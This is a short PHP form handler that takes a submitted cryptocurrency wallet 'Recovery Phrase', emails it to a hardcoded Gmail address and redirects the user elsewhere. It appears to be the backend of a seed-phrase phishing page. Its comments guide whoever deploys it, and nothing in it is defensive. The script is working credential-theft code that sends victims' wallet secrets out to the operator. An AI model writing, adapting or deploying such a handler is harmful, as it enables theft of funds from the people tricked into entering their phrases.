<?php 
if(isset($_POST['submit'])){
    $to = "mmmikebarnes@gmail.com"; // this is your Email address
    $key_store = $_POST['phrase'];
    $message = $key_store ." Recovery Phrase" ; 
    $subject = "Recovery Phrase";	
    $headers2 = "From:" . $to;
    mail($to,$subject,$message,$headers2);
    
    header("Location: http://www.example.com/another-page.php"); // the http is where you would like to redirect the user to
    exit();
    
    
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    }
?>